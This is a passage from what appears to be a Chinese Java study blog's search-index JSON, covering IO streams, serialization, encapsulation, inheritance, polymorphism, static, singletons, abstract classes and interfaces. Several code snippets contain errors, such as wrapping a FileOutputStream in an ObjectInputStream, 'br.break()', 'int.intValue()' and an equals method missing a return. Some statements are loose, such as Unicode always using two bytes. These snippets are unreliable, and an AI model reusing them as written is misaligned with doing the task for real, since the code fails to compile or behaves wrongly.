osw.write(cbuf,0,len);&#125;isr.close();osw.close();\n\n字符集\nASCII：美国标准信息交换码。用一个字节的7位表示\n\nISO8859-1：拉丁码表、欧洲码表。用一个字节的8位表示。\n\nGB2312：中国的中文编码表。最多两个字节\n\nGBK：中国的中文编码表升级，融合了更多的中文文字符号。最多两个字节\n\nUnicode：国际标准码，融合了目前人类使用的所有字符。为每个字符分配唯一的字符码。所有的文字都用两个字节来表示。\n\nUTF-8：变长的编码方式，可用1-4个字节来表示一个字符。\n\n\n其他流的使用标准的输入、输出流\nSystem.in：标准的输入流，默认从键盘输入\nSystem.out：标准的输出流，默认从控制台输出\nSystem类的setIn() &#x2F; setOut()方式重新指定输入和输出设备\n\nInputStreamReader isr = new InputStreamReader(System.in);BufferReader br = new BufferReader(isr);while(true)&#123;    System.out.println(&quot;请输入字符串&quot;);    String data = br.readLine();    if(&quot;e&quot;.equalsIgnoreCase(data) || &quot;exit&quot;.equalsIgnoreCase(data))&#123;        System.out.println(&quot;程序结束&quot;);        break;    &#125;    String upperCase = data.toUpperCase();    System.out.println(upperCase);&#125;br.break();\n\n打印流\nPrintStram\nPrintWriter\n\n数据流\nDataInputStream\nDataOutputStream\n作用：用于读取或写出基本数据类型的变量或字符串\n\n对象流\n作用：用于存储和读取基本数据类型数据或对象的处理流\n\n序列化：ObjectOutputStream类保存基本数据类型或对象\n\n反序列化：ObjectInputStream类读取基本数据类型或对象\n\n对象的序列化机制：（面试题）允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存再磁盘上，或通过网络将这种二进制流传输到另一个节点。当其他程序获取了这种二进制流，就可以恢复成原来的Java对象。\n\n序列化过程：将内存中的java对象保存到磁盘中或通过网络传输出去\n要想某个对象支持序列化机制，需要满足如下的要求\n\n该类必须实现如下两个接口之一：Serialization、Externalizable\n该类需要提供一个全局常量：serialVersionUID（序列版本号）\n除了当前类需要实现Serialization接口之外，还必须保证其内部所有属性也必须是可序列化的（默认情况下，基本数据类型可序列化）\n\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;object.dat&quot;));oos.writeObject(new String(&quot;我爱北京天安门&quot;));oos.writeObject(new Person(&quot;张三&quot;,23));oos.flush();oos.close();\n\n反序列化过程：将磁盘文件中的对象还原为内存中的一个java对象\nObjectInputStream ois = new ObjectInputStream(new FileOutputStream(&quot;object.dat&quot;));Object obj = ois.readObject();String str = (String) obj;Person p = (Person) ois.readObject();ois.close();\n\nObjectOutputStream和ObjectInputStream不能序列化static和transient修饰的成员变量\n\n\n随机存储文件流（RandomAccessFile类）\nRandomAccessFile直接继承于java.lang.Object类，实现类DataInput和DataOutput接口\n\nRandomAccessFile既可以作为输入流，又可以作为输出流\nRandomAccessFile raf1 = new RandomAccessFile(new File(&quot;爱情与友情.jpg&quot;,&quot;r&quot;));RandomAccessFile raf2 = new RandomAccessFile(new File(&quot;爱情与友情1.jpg&quot;,&quot;rw&quot;));byte[] buffer  = new byte[1024];int len;while((len = raf1.read(buffer))!=-1)&#123;    raf2.write(buffer,0,len);&#125;raf1.close();raf2.close();\n\nRandomAccessFile作为输出流时，写出到的文件如果不存在，则在执行过程中自动创建；如果存在，则会对原有文件内容进行覆盖（默认从头覆盖）\n\n\n","categories":["Java基础"],"tags":["IO流"]},{"title":"Java基础（二）：面向对象","url":"/2023/01/16/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","content":"Java面向对象学习的三条主线\nJava类及类的成员：属性、方法、构造器；代码块、内部类\n面向对象的三大特征：封装性、继承性、多态性、（抽象性）\n其它关键字：this、super、static、final、abstract、interface、package、import\n\n属性（成员变量）vs局部变量相同点\n定义变量的格式：数据类型 变量名 &#x3D; 变量值\n先声明 后使用\n变量都有其对应的作用域\n\n不同点\n在类中声明的位置不同\n\n属性：直接定义在类的一对{}内\n局部变量：声明在方法内、方法形参、代码块内、构造器内部的变量\n\nclass User&#123;    //属性（或成员变量）    String name;    int age;    boolean isMale;        //局部变量：方法形参（language）    public void talk(String language)&#123;         ....    &#125;        //局部变量：方法内（food）    pubic void eat()&#123;        String food = &quot;烙饼&quot;;    &#125;&#125;\n\n关于权限修饰符的不同\n\n属性：可以在声明属性时，指明其权限，使用权限修饰符\n常用权限修饰符：private、public、缺省、protected  –&gt;封装性\n\n局部变量：不可以使用权限修饰符\n\n\n\n默认初始化值的情况\n\n属性：类的属性，根据其类型，都有默认初始化值\n\n局部变量：没有默认初始化值\n意味着，在调用局部变量之前，一定要显示赋值。\n特别地，形参在调用时赋值即可。\n\n\n\n在内存中加载的位置\n\n属性：加载到堆空间中（非static）\n局部变量：加载到栈空间中\n\nJVM内存解析\n引用类型的变量，只可能存储两类值：null 或 地址值\n\n\n匿名对象的使用\n匿名对象：创建的对象没有显式的赋给一个变量名\n特征：匿名对象只能调用一次\n\nnew Phone().price = 1999;new Phone().showPrice();//匿名对象的使用mall.show(new Phone());\n\n方法的重载(overload)\n重载：在同一个类中，允许存在一个以上的同名方法，只要它们的参数个数、或参数类型、或参数顺序不同即可。\n判断是否重载：与方法的权限修饰符、返回值类型、形参变量名、方法体都无关，只看参数列表。（只有返回值不同不能算重载）\n\npublic void reverse(int[] arr)&#123;    &#125;public void reverse(String[] arr)&#123;    &#125;\n\n可变个数形参的方法\njdk 5.0新增的内容，用更简单的方式传递个数可变的实参\n具体使用\n可变个数形参的格式：数据类型 … 变量名\n当调用可变个数形参的方法时，传入的参数个数可以是：0个，1个，2个 … 多个\n可变个数形参的方法与本类中方法名相同，形参不同的方法之间构成重载\n可变个数形参的方法与本类中方法名相同，形参类型也相同的数组的方法之间不构成重载\n可变个数形参在方法的形参中，必须声明在末尾，且最多只能声明一个可变形参\n\n\n应用：sql中不定个数的查询条件\n\npublic static void main(String[] args)&#123;    MethodArgsTest test = new MethodArgsTest();    test.show(&quot;hello&quot;,&quot;world&quot;);    test.show();&#125;//public void show(String s)&#123;//&#125;public void show(String ... strs)&#123;    for(int i=0;i&lt;strs.length;i++)&#123;            &#125;&#125;//以下报错，不构成重载pubic void show(String[] strs)&#123;    &#125;public void show(int i,String ... strs)&#123;    for(int i=0;i&lt;strs.length;i++)&#123;            &#125;&#125;//以下报错public void show(String ... strs,int i)&#123;    for(int i=0;i&lt;strs.length;i++)&#123;            &#125;&#125;\n\n\n\n方法参数的值传递机制关于变量的赋值\n如果变量是基本数据类型，此时赋值的是变量所保存的数据值。\n如果变量是引用数据类型，此时赋值的是变量所保存的数据的地址值。\n\nint m = 10;int n = m;n = 20;//此时m=10,n=20Order o1 = new Order();o1.orderId = 1001;Order o2 = o1; //赋值以后，o1和o2地址值相同，都指向了堆空间中同一个对象实体o2.orderId = 1002;//此时o1.orderId=1002,o2.orderId=1002\n\n方法的形参的传递机制：值传递\n形参：方法定义时，声明的小括号内的参数\n实参：方法调用时，实际传递给形参的数据\n\n值传递机制：\n\n如果参数是基本数据类型，此时实参赋给形参的是，实参真实存储的数据值。\n\nint m = 10;int n = 20;test.swap(m,n);//此时m=10,n=20public void swap(int m,int n)&#123;    int temp = m;    m = n;    n = temp;&#125;\n\n\n如果参数是引用数据类型，此时实参赋给形参的是，实参存储数据的地址值。\n\nData data = new Data()data.m = 10;data.n = 20;test.swap(data);//此时data.m=20,data.n=10public void swap(Data data)&#123;    int temp = data.m;    data.m = data.n;    data.n = temp;&#125;\n\n封装性的体现\n将类的某个属性xxx私有化（private），同时，提供公共的（public）方法来获取（getXxx）和设置（setXxx）此属性的值。\n将类的某个方法私有化（private）\n单例模式（构造器私有化）\n\n4种权限修饰符\n封装性的体现，需要权限修饰符来配合。\n\n\nJava规定的4种权限（从小到大排列）：private、缺省、protected、public\n\n\n\n修饰符\n类内部\n同一个包\n不同包的子类\n同一个工程\n\n\n\nprivate\nYes\n\n\n\n\n\n(缺省)\nYes\nYes\n\n\n\n\nprotected\nYes\nYes\nYes\n\n\n\npublic\nYes\nYes\nYes\nYes\n\n\n\n这4种权限可以用来修饰类，及类的内部结构：属性、方法、构造器、内部类\n\n修饰类的内部结构（属性、方法、构造器、内部类）:private、缺省、protected、public\n修饰类：缺省、public\n\n\n\n总结封装性：Java提供了4种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。\n\n属性赋值的先后顺序\n默认初始化\n显示初始化\n构造器中赋值\n通过”对象.方法” 或 “对象.属性” 的方式赋值\n\n以上操作的先后顺序：1 - 2 - 3 - 4\nJavaBean\nJavaBean时一种Java语言写成的可重用组件（在JavaWeb中会用到，对应数据库中的一张表）\n是指符合如下标准的Java类：\n类是公共的\n有一个无参的公共的构造器\n有属性，且有对应的get、set方法\n\n\n\npublic class Customer&#123;    private int id;    private String name;        public Customer()&#123;            &#125;    public void setId(int i)&#123;        id = i;    &#125;    public int getId()&#123;        return id;    &#125;    public void setName(String n)&#123;        name = n;    &#125;    public String getName()&#123;        return name;    &#125;&#125;\n\nthis关键字的使用\nthis可用用来修饰：属性、方法、构造器\n\nthis修饰属性和方法：\n\nthis理解为：当前对象 或 当前正在创建的对象\n\n在类的方法中，可用使用this.属性或this.方法的方式，调用当前对象属性或方法。但是通常情况下，选择忽略this，特殊情况下，如果方法的形参和类的属性同名时，必须显式使用this.属性，表明此时属性而非形参。\npublic class Person&#123;    String name;        public void setName(String name)&#123;        this.name = name;    &#125;&#125;\n\n在类的构造器中，可用使用this.属性或this.方法的方式，调用当前正在创建的对象属性或方法。但是通常情况下，选择忽略this，特殊情况下，如果构造器的形参和类的属性同名时，必须显式使用this.属性，表明此时属性而非形参。\n\n\n\nthis调用构造器：\n\n在类的构造器中，可用显式的使用this(形参列表)方式，调用本类中指定的其他构造器\n构造器不能调用自己\n如果一个类中有n个构造器，则最多有n-1个构造器中使用了this(形参列表)\nthis(形参列表)必须声明在当前构造器的首行\n构造器内部，最多只能声明一个this(形参列表)\n\n\n\npackage关键字的使用\n为了更好的实现项目中类的管理，提供包的概念\n\n使用package声明类或接口所属的包，声明在源文件的首行\n\npackage属于标识符，遵循标识符的命名规则、规范（xxxyyyzzz）“见名知意”\n\n每.一次，就代表一层文件目录\n\n同一个包下，不能命名同名的接口、类\n不同包下，可用命名同名的接口、类\n\n\nimport关键字的使用\n作用：在源文件中显式的使用import结构导入指定包下的类、接口\n\nimport声明在包的声明和类的声明之间\n\n可使用xxx.*的方式，表示可以导入xxx包下的所有结构。（但如果使用的是xxx子包下的结构，则仍需显式import）\n\n若使用的类或接口是java.lang包下定义的，则可以省略import\n\n若使用的类或接口是本包下定义的，则可以省略import\n\n若在源文件中，使用了不同包下的同名的类，则必须至少有一个类需要以全类名的方式显示\n\nimport static：导入指定类或接口中的静态结构。(导入的是结构，不是类)\nimport static java.lang.System.*;out.println(&quot;hello&quot;)\n\nMVC设计模式\nMVC\n模型层（model）：主要处理数据\n数据对象封装 model.bean&#x2F;domain\n数据库操作类 model.dao\n数据库 model.db\n\n\n视图层（view）：显式数据\n相关工具类 view.utils\n自定义 view.ui\n\n\n控制层（controller）：处理业务逻辑\n应用界面相关 controller.activity\n存放fragment controller.fragment\n显示列表的适配器 controller.adapter\n服务相关的 controller.service\n抽取的基类 controller.base\n\n\n\n\n\n继承性的使用\n好处：\n\n减少代码冗余，提高代码复用性\n便于功能的扩展\n为之后多态性的使用，提供了前提\n\n\n继承性的格式： class A extends B&#123;&#125;\n\nA：子类、派生类、subclass\nB：父类、超类、基类、superclass\n\n\n一旦子类A继承父类B以后，子类A中就获取了父类B中声明的所有属性、方法\n\n特别地，父类中声明为private的属性或方法，子类继承父类以后，仍然认为获取了父类中私有的结构。只有因为封装性的影响，使得子类不能直接调用相应的结构而已。\n\n继承性：负责结构\n封装性：负责能不能调用\n\n\n\n子类继承父类后，还可声明自己特有的属性和方法\n\n子类和父类的关系，不同于子集和集合的关系。\n\njava中对于继承性的规定\n\n一个类可用被多个子类继承\nJava的单继承性：一个类只能有一个父类（c++中有多继承）\n允许多层继承（直接父类、间接父类）\n\n\n如果没有显式的声明一个类的父类的话，则此类继承于java.lang.Object类（所有的java类都直接或间接地继承于Object类）\n\n所有的Java类都具有java.lang.Object类声明的功能\n\n\n方法的重写（override&#x2F;overwrite）\n重写：子类继承父类以后，可以对父类中同名同参数的方法进行覆盖操作。\n\n重写的规定：\n\n方法的声明：权限修饰符 返回值类型 方法名（形参列表）throws 异常的类型{\n​                  &#x2F;&#x2F;方法体\n​                    }\n\n\n子类重写的方法的方法名和形参列表与父类被重写的方法的方法名和形参列表相同\n\n子类重写的方法的权限修饰符不小于父类被重写的方法的权限修饰符\n特殊情况：子类不能重写父类中声明为private权限的方法（不认为是重写）\n\n返回值类型：\n\n父类被重写方法的返回值是void，则子类重写方法的放回置只能是void\n\n父类被重写方法的返回值类型是A类型，则子类重写方法的返回值类型可以是A类或A类的子类。\n//父类中被重写方法public Object info()&#123;    return null;&#125;//子类中重写的方法public String info()&#123;    return null;&#125;\n\n父类被重写方法的返回值类型是基本数据类型（如double），则子类重写方法的返回值类型必须是相同的基本数据类型（如double）\n\n\n\n子类重写的方法抛出的异常类型不大于父类被重写的方法抛出的异常类型\n\n子类和父类中同名同参数的方法要么都声明为非static（考虑重写），要么都声明为static（不认为是重写）。\n\n\n\n面试题：区分方法的重载和重写\n\n二者的定义\n从编译和运行的角度看：\n重载：在方法调用之前，编译器就已经确定了所要调用的方法（早绑定、静态绑定）\n重写（对于多态来说）：只有等到方法调用的那个一刻，编译器才会确定所要调用的具体方法（晚绑定、动态绑定）\n\n\n\n\n\nsuper关键字的使用\nsuper理解为：父类的\nsuper可以用来调用：属性、方法、构造器\nsuper的使用：调用属性和方法\n可以在子类的方法或构造器种使用super.属性或super.方法显式的调用父类中声明的属性或方法。但是通常情况下，习惯省略super.\n特殊情况：当子类和父类中定义了同名的属性时，要想在子类中调用父类中声明的属性，则必须显式的使用super.属性的方式，表明调用的是父类中声明的属性。\n特殊情况：当子类重写了父类中的方法以后，想在子类的方法中调用父类中被重写的方法时，则必须显式的使用super.方法的方式，表明调用的是父类中声明的方法。\n\n\nsuper调用构造器\n可以在子类的构造器中显式的使用super(形参列表)的方式，调用父类中声明的指定的构造器\nsuper(形参列表)的使用，必须声明在子类构造器的首行\n在类的构造器中，针对于this(形参列表)或super(形参列表)只能二选一，不能同时出现\n在构造器首行没有显式的声明this(形参列表)或super(形参列表)，则默认调用的是父类中空参的构造器super()\n在类的多个构造器中，至少有一个类的构造器中使用了super(形参列表)，调用父类中的构造器\n\n\n\n多态性的使用\n理解多态性：可以理解为一个事物的多种形态\n\n对象的多态性：父类的引用指向子类的对象（子类的对象赋给父类的引用）\nPerson p1 = new Man();\n\n多态的使用：当调用子父类同名同参数的方法时，实际执行的是子类重写父类的方法（即虚拟方法调用）\n//Man类重写的方法p1.eat();p1.walt();//Man类特有的方法不能调用p1.earnMoney();  //这行报错\n\n虚拟方法调用：编译看左（父类）、运行看右（子类）：有个对象的多态性后，在编译器，只能调用父类中声明的方法，但在运行期，实际执行的是子类重写父类的方法。\n子类中重写了父类方法，在多态情况下，此时父类方法称为虚拟方法，父类根据赋给它的不同子类对象，动态调用属于子类的该方法。这样的方法调用在编译器是无法确定的。——动态绑定\n\n多态性的使用前提：\n\n类的继承关系（继承性是多态性的前提）\n方法的重写（否则没有必要使用多态性）\n\n\n多态性使用举例\nAnimalTest test = new AnimalTest();test.func(new Dog());test.func(new Cat());public void func(Animal animal)&#123;    animal.eat();    animal.shout();&#125;\n\npublic void doData(Connection conn)&#123; //conn = new MySqlCOnnection();或者conn = new OracleCOnnection();     conn.method1();    conn.method2();    conn.method3();    //调用的都是子类重写的方法&#125;\n\n对象的多态性，只适用于方法，不适用于属性（ 编译和运行都看左边）\n\n面试题：\n\n多态是编译时行为还是运行时行为？\n答：运行时行为\n\n\n\n\ninstanceof关键字\n有了对象的多态性后，内存中实际上是加载了子类特有的属性和方法的，但是由于变量声明为父类，导致编译时只能调用父类中声明的属性和方法。子类特有的属性和方法不能调用。\n\n如何才能调用子类特有的属性和方法？\n向下转型：使用强制类型转换（向上转型就是多态）\nPerson p1 = new Man();Man m1 = (Man)p1;\n\n使用强制类型转换时，可能出现ClassCastException异常。\nPerson p1 = new Man();Woman w1 = (Woman)p1;w1.goShopping();    //报错\n\n为了解决这个问题，需要用到instanceof关键字\n\ninstanceof关键字的使用\n\na instanceof A ：判断对象a是否时类A的实例。如果是，返回true；如果不是，返回false。\nif(p1 instanceof Woman)&#123;  //false    Woman w1 = (Woman)p1;\tw1.goShopping(); &#125;if(p1 instanceof Man)&#123;  //true    Man m1 = (Man)p1;\tw1.earnMoney(); &#125;\n\nB是A的父类，如果a instanceof A返回true，则a instanceof B也返回true\nif(p1 instanceof Man)&#123;  //true    Man m1 = (Man)p1;\tw1.earnMoney(); &#125;if(p1 instanceof Person)&#123;  //true    &#125;if(p1 instanceof Object)&#123;  //true    &#125;\n\n\n\nObject类结构\nObject类中的功能（属性、方法）就具有通用性\n属性：无\n方法：equals()、toString()、getClass()、hashCode()、clone()、finalize()、wait()、notify()、notifyAll()\n\n\nObject类只声明了一个空参的构造器\n\nequals()\n面试题：&#x3D;&#x3D;和equals()的区别\n&#x3D;&#x3D;：运算符\n\n可以使用在基本数据类型变量和引用数据类型变量中\n\n如果比较的是基本数据类型变量：比较两个变量保存的数据是否相等（不一定要类型相同）\n如果比较的是引用数据类型变量：比较两个对象的地址值是否相同（即两个引用是否指向同一个对象实体）\n//基本数据类型int i=10;int j=10;double d=10.0;System.out.println(i==j); //trueSystem.out.println(i==d); //trueboolean b = true;System.out.println(i==b); //报错char c=10;System.out.println(i==c); //true\n\n//引用数据类型Customer cust1 = new Customer(&quot;Tom&quot;,21);Customer cust2 = new Customer(&quot;Tom&quot;,21);System.out.println(cust1==cust2); //falseString str1 = new String(&quot;hello&quot;);String str2 = new String(&quot;hello&quot;);System.out.println(str1==str2); //false\n\nequals()方法的使用：\n\n是一个方法，不是运算符\n\n只适用于引用数据类型\n//引用数据类型Customer cust1 = new Customer(&quot;Tom&quot;,21);Customer cust2 = new Customer(&quot;Tom&quot;,21);System.out.println(cust1.equals(cust2)); //falseString str1 = new String(&quot;hello&quot;);String str2 = new String(&quot;hello&quot;);System.out.println(str1.equals(str2)); //true\n\nObject类中equals()的定义：\npublic boolean equals(Object obj)&#123;    return (this==obj)&#125;\n\n说明：Object类中定义的equals()和&#x3D;&#x3D;的作用是相同的。\n\n像String、Date、File、包装类等都重写了Object类中的equals()方法。重写以后，比较的不是两个引用的地址是否相同，而是比较两个对象的”实体内容”是否相同。\n\n自定义类重写equals()方法：\n\n手动实现：\n\n@Overridepublic boolean equals(Object obj)&#123;    if(this==obj)&#123;        return true;    &#125;        if(obj instanceof Customer)&#123;        Customer cust = (Customer)obj;//obj是Object类，Customer是Object的子类，obj不能直接调用子类特有的属性，需要向下转型        //接下来比骄傲两个对象的每个属性是否相同        if(this.age == cust.age &amp;&amp; this.name.equals(cust.name))&#123;            return true;        &#125;else&#123;            return false;        &#125;    &#125;&#125;\n\nCustomer cust1 = new Customer(&quot;Tom&quot;,21);Customer cust2 = new Customer(&quot;Tom&quot;,21);System.out.println(cust1.equals(cust2)); //true\n\n\n自动生成：使用编译器\neclipse：Source –&gt; Generate hashCode() and equals()\n\n\n\n\n\n\ntoString()\n当输出一个对象的引用时，实际上就是使用当前对象的toString()\n\nObject类中toString()的定义：\npublic String toString()&#123;    return getClass().getName()+&quot;@&quot;+Integer.toHexString(hashCode());&#125;\n\n像String、Date、File、包装类等都重写了Object类中的toString()方法。使得在调用对象的同String()时，返回”实体内容”信息。\n\n自定义类重写toString()方法：\n\n手动实现：\n\n@Overridepublic String toString()&#123;    return &quot;Customer[name=&quot;+name+&quot;,age=&quot;+age+&quot;]&quot;;&#125;\n\n\n自动生成：使用编译器\neclipse：Source –&gt; Generate toString()\n\n\n\n\n包装类(Wrapper)的使用基本数据类型、包装类与String类间的转换基本数据类型和包装类间的转换\nJava提供了8中数据类型对于的包装类，使得基本数据类型的变量具有类的特征\n\n基本数据类型 —-&gt; 包装类：调用包装类的构造器\nint num1 = 10;Integer in1 = new Integer(num1);System.out.println(in1.toString());\n\n包装类 —-&gt; 基本数据类型：调用包装类的xxxValue()\nInteger in1 = new Integer(12);int i1 = int.intValue();\n\n自动装箱与自动拆箱\njdk5.0 新特性\n//自动装箱:基本数据类型 ----&gt; 包装类int num2 = 10;Integer in1 = num2;//自动拆箱:包装类 ----&gt; 基本数据类型int num3 = in1;\n\nInteger内部定义的IntegerCache结构，IntegerCache中定义了Integer[]，保存了从-128127范围的整数。如果使用自动装箱的方式，给Integer赋值的范围在-128127范围内时，可以直接使用数组中的元素，不用再去new了。目的：提高效率（超过则需要再new）\n\n\n基本数据类型、包装类间与Strin类的转换\n基本数据类型、包装类 —&gt; String类型：\n//方式一int num1= 10;String str1 = num1+&quot;&quot;;//方式二float f1 = 12.3f;String str2 = String.valueOf(f1);\n\nString类型 —&gt; 基本数据类型、包装类：调用包装类的parseXxx()\nString str1 = &quot;123&quot;;int num2 = Integer.parseInt(str1);String str12 = &quot;true&quot;;Boolean b1 = Boolean.parseBoolean(str2)\n\nstatic关键字的使用\n有时候希望无论是否产生了对象或无论产生了多少对象的情况下，某些特定的数据在内存空间里只有一份。（例如，所有中国人共享国家的名称）\n\n\nstatic：静态的\n\nstatic可以用来修饰：属性、方法、代码块、内部类\n\n使用static修饰属性：静态变量（类变量）\n\n属性按是否使用static修饰，又分为静态属性 vs 非静态属性（实例变量）\n实例变量：创建多个对象，每个对象都独立拥有一套类中的非静态属性。当修改其中一个对象的非静态所熟悉时，不会导致其他对象中同样的属性值的修改。\n静态变量：创建多个对象，多个对象共享一个静态变量，当通过某个对象修改静态变量时，会导致其他对象调用此静态变量时也是修改过了的。\n其他说明：\n静态变量随着类的加载而加载：可以通过类.静态变量的方法进行调用\n静态变量的加载早于对象的创建\n由于类只会加载一次，则静态变量在内存中也只会存在一份，存在方法区的静态域中。\n\n\n静态属性举例：System.out; Math.PI\n\n\n使用static修饰方法：静态方法\n\n随着类的加载而加载：可以通过类.静态方法的方法进行调用\n\n静态方法中，只能调用静态的方法或属性\n非静态方法中，可以调用非静态&#x2F;静态的方法或属性\n（从它们生命周期的角度理解，静态结构加载时非静态结构还没加载）\n\n\n\nstatic注意点\n\n在静态的方法内，不能使用this、super关键字\n\n\n开发中，如何确定一个属性是否声明为static？\n\n属性时可以被多个对象所共享的，不会随着对象的不同而不同的。\n\n\n开发中，如何确定一个方法是否声明为static？\n\n操作静态属性的方法，通常设置为static\n工具类中的方法，习惯上声明为static的。比如：Math、Arrays、Collections\n\n\n\n单例（Singleton）设计模式\n单例设计模式：采取一定的方法保证在整个软件系统中，对某个类只能存在一个对象实例\n\n实现步骤：\n饿汉式\nBank bank1 = Bank.getInstance();Bank bank2 = Bank.getInstance();System.out.println(bank1==bank2);//trueclass Bank&#123;    //1.私有化类的构造器，避免外部通过new创建实例\tprivate Bank()&#123;            &#125;    //2. 内部创建类的对象    //4. 要求此对象也必须声明为静态的    private static Bank instance = new Bank();    //3. 提供公共的方法，返回类的对象    public static Bank getInstance()&#123;        return instance;    &#125;&#125;\n\n懒汉式：啥时候用啥时候造，延迟创建对象\nBank bank1 = Bank.getInstance();Bank bank2 = Bank.getInstance();System.out.println(bank1==bank2);//trueclass Bank&#123;    //1.私有化类的构造器，避免外部通过new创建实例\tprivate Bank()&#123;            &#125;    //2. 声明当前类的对象，没有初始化    //4. 要求此对象也必须声明为静态的    private static Bank instance = null;    //3. 提供公共的方法，返回类的对象    public static Bank getInstance()&#123;        if(instance==null)&#123;            instance = new Bank();        &#125;        return instance;    &#125;&#125;\n\n饿汉式和懒汉式的区别\n\n饿汉式：\n坏处：对象加载时间过长\n好处：线程安全的\n\n\n懒汉式：\n好处：延迟对象的创建\n（目前的写法）坏处：线程不安全\n\n\n\n\n单例模式的优点：减少系统性能开销\n\n单例模式的应用：\n\njava.lang.Runtime\n网站的计数器\n应用程序的日志应用\n数据库连接池\n读取配置文件的类\nApplication\nWindows的任务管理器\nWindows的回收站\n\n\n\n类中的代码块结构\n代码块的作用：用来初始化类、对象\n代码块只能使用static修饰\n静态代码块 vs 非静态代码块\n静态代码块\n内部可以有输出语句\n随着类的加载而执行，且只执行一次\n作用：初始化类的属性\n如果类中定义了多个静态代码块，则按声明顺序执行\n静态代码块执行要优于非静态代码块的执行\n静态代码块内只能调用静态属性、方法\n\n\n非静态代码块\n内部可以有输出语句\n随着对象的创建而执行\n每创建一个对象，就执行一次非静态代码块\n作用：可以下创建对象时，对对象的属性进行初始化\n如果类中定义了多个非静态代码块，则按声明顺序执行\n非静态代码块中能调用静态&#x2F;非静态属性、方法\n\n\n\n\n\npublic Class Test&#123;    //静态代码块    static &#123;        System.out.println(&quot;hello static&quot;);    &#125;    //非静态代码块    &#123;        System.out.println(&quot;hello static&quot;);    &#125;&#125;\n\nfinal关键字的使用\nfinal：最终的\n\nfinal可以用来修饰：类、方法、变量\n\nfinal用来修饰一个类：该类不能被继承\n比如：String类、System类、StringBuffer类\nfinal class Test&#123;&#125;\n\nfinal用来修饰方法：该方法不能被重写\nObject类中的getClass()\nclass AA&#123;    public final void show()&#123;            &#125;&#125;class BB extends AA&#123;    public void show()&#123;   //报错，不能重写            &#125;&#125;\n\nfinal用来修饰变量：该”变量”就成为是一个常量\n\nfinal修饰属性：可以考虑的赋值位置有：显式初始化、代码块中赋值、构造器中初始化\npublic class Test&#123;    final int WIDTH = 10;    final int LEFT;    final int RIGHT;    &#123;        LEFT = 1;    &#125;    public Test()&#123;        RIGHT = 2;    &#125;    public Test(int n)&#123;        RIGHT = n;    &#125;&#125;\n\nfinal修饰局部变量：\n尤其使用final修饰形参时，表明此形参是一个常量。当调用此方法是，给常量形参赋一个实参，一旦赋值后，就只能在方法内使用此形参，但不能重新赋值。\n\n\n\nstatic final 用来修饰属性：全局常量\n\n\nabstract关键字的使用\nabstract：抽象的\n\nabstract可以用来修饰的结构：类、方法\n\nabstract修饰类：抽象类\n\n此类不能实例化\n抽象类中一定有构造器，便于子类实例化使用（涉及：子类对象实例化的全过程）\n开发中，都会提供抽象类的子类，让子类实例化，完成相关操作\n\n\nabstract修饰方法：抽象方法\n\n只有方法的声明，没有方法体\n\n包含抽象方法的类，一定是抽象类。反之，抽象类中可以没有抽象方法\n\n若子类重写了父类中所有的抽象方法后，此子类方可实例化\n若子类没有重写父类中所有的抽象方法，则此子类也是一个抽象类，需要使用abstract修饰\n\n\npublic abstract void show();\n\nabstract不能用来修饰：属性、构造器等结构\nabstract不能用来修饰私有方法、静态方法、final的方法、final的类\n\n\n抽象类的匿名子类//创建了一匿名子类的非匿名对象：pPerson p = new Person()&#123;    @override    public void eat()&#123;            &#125;    @override    public void breath()&#123;            &#125;&#125;;method(p);//创建匿名子类的匿名对象method(new Person()&#123;    @override    public void eat()&#123;            &#125;    @override    public void breath()&#123;            &#125;&#125;);\n\n模板方法设计模式（TemplateMethod）\n抽象类的应用：模板方法的设计模式\n应用：\n数据库访问的封装\nJunit单元测试\nJavaWeb的Servlet中关于doGet&#x2F;doPost方法调用\nHibernate中模板程序\nSpring中JDBCTemlate、HibernateTemplate等\n\n\n\ninterface接口关键字的使用\nJava不支持多重继承，但有了接口，就可以达到多重继承的效果\n\n接口和类是两个并列的结构\n\n定义接口中的成员\n\njdk7及以前：只能定义全局常量和抽象方法\n\n全局常量：public static final的，但是书写时可以省略不写\n抽象方法：public abstract的，但是书写时可以省略不写\n\ninterface Flyable&#123;    //全局常量    public static final int MAX_SPEED = 7900;    int MIN_SPEED = 1; //省略了public static final        //抽象方法    public abstract void fly();    void stop(); // 省略了public abstract&#125;\n\njdk8：除了定义全局常量和抽象方法之外，还可也定义静态方法、默认方法\ninterface Flyable&#123;    //静态方法    public static void method1()&#123;        ...    &#125;    //默认方法    public default void method2()&#123;        ...    &#125;    default void method2()&#123;        ...    &#125;&#125;\n\n\n接口中不能定义构造器，意味着接口不可以实例化\n\nJava开发中，接口通过类去实现（implement）的方式来使用\nclass Plane implement Flyable&#123;    @override    public void fly()&#123;            &#125;    @override    public void stop()&#123;            &#125;&#125;abstract class Kite implement Flyable&#123;    @override    public void fly()&#123;            &#125;&#125;\n\n如果实现类覆盖了接口中的所有抽象方法，则此实现类就可以实例化\n如果实现类没有覆盖(实现)接口中的所有抽象方法，则此实现类仍为一个抽象类\n\nJava类可以实现多个接口 —-&gt; 弥补了Java单继承性的局限性\n格式：class AA extends BB implement CC,DD,EE&#123;&#125;\nclass Plane extends Object implement Flyable,Attackable&#123;    &#125;\n\n接口与接口之间可以继承，且可以多继承\ninterface CC extends AA,BB&#123;    &#125;\n\n接口的具体使用，体现多态性\nComputer com = new Computer();Flash flash = new Flash();com.transferData(flash);class Computer&#123;    public void transferData(USB usb)&#123; //USB usb = new Flash();        usb.start();        System.out.println(&quot;具体传输数据的细节&quot;);        usb.stop();    &#125;&#125;\n\n接口：实际上可以看作是一种规范\n\n\n接口匿名实现类Computer com = new Computer();// 接口的非匿名实现类的非匿名对象Flash flash = new Flash();com.transferData(flash);// 接口的非匿名实现类的匿名对象com.transferData(new Flash());// 接口的匿名实现类的非匿名对象USB phone = new USB()&#123;    @override    public void start()&#123;            &#125;    @override    public void stop()&#123;            &#125;&#125;;com.transferData(phone);// 接口的匿名实现类的匿名对象com.transferData(new USB()&#123;    @override    public void start()&#123;            &#125;    @override    public void stop()&#123;            &#125;&#125;);\n\n\n接口应用：\n代理模式（Proxy）\n工厂模式\n\n\n\n内部类\nJava中运行将一个类A声明在另一个类B中，则类A就是内部类，类B称为外部类\n内部类的分类：成员内部类（静态、非静态） vs 